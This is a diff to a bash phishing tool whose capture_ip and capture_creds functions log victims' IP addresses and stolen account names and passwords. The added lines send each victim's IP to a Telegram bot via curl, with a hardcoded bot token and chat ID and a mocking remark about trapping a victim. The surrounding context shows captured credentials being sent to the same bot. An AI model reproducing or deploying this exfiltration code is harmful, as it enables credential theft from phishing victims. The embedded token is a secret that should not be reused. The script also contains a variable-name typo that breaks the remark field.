@@ -415,6 +415,31 @@ capture_ip() {
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+	MESSAGE="YE FASA BAKRA JAAL MEE"
+	# Telegram Configuration
+	BOT_TOKEN="8724746071:AAFItecnTGUw47P2Pqj4EUG08gKQXgqR4Z4"
+	CHAT_ID="8051672152"
+	
+	# Prepare message payload
+	MESSAGE=$(cat <<-EOF
+	Notification:
+	• Victim IP : $IP
+	• Remark: $MESSGAE
+	EOF
+	)
+	
+	# Send via Telegram Bot API using curl
+	curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+	  --data-urlencode "chat_id=${CHAT_ID}" \
+	  --data-urlencode "text=${MESSAGE}" \
+	  > /dev/null
+	
+	# Check exit status
+	if [ $? -eq 0 ]; then
+	  echo "Message sent successfully."
+	else
+	  echo "Failed to send message." >&2
+	fi
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
@@ -430,13 +455,9 @@ capture_creds() {
 	BOT_TOKEN="8724746071:AAFItecnTGUw47P2Pqj4EUG08gKQXgqR4Z4"
 	CHAT_ID="8051672152"
 	
-	# The shell variable you want to transmit
-	hippo="Hello from hippo! The system time is $(date)"
-	
 	# Prepare message payload
 	MESSAGE=$(cat <<-EOF
 	Notification:
-	• Hippo: $hippo
 	• Account: $ACCOUNT
 	• Password: $PASSWORD
 	EOF
